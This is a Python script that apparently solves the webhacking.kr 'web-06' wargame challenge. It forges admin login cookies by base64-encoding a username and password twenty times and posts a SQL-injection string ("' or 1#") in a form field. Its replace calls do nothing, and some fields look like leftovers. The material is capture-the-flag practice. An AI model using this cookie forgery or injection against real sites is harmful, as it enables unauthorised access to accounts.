import base64
import requests

URL = "https://webhacking.kr/challenge/web-06/"
SESSION_ID = "123"
cookies = {'PHPSESSID':SESSION_ID}
params ={'answer':1010100000011100101011111}
data = {'answer':'1010100000011100101011111\' or 1#', 'id':'''0b100 '''}

id = "admin"
pw = "nimda"

for i in range(20):
    id = base64.b64encode(id.encode("utf-8")).decode()
    pw = base64.b64encode(pw.encode("utf-8")).decode()

id.replace("!","1")
id.replace("@","2")
id.replace("$","3")
id.replace("^","4")
id.replace("&","5")
id.replace("*","6")
id.replace("(","7")
id.replace(")","8")

pw.replace("!","1")
pw.replace("@","2")
pw.replace("$","3")
pw.replace("^","4")
pw.replace("&","5")
pw.replace("*","6")
pw.replace("(","7")
pw.replace(")","8")


cookies['user'] = id
cookies['password'] = pw

response = requests.post(URL, data=data, params=params, cookies=cookies)
print(response.text)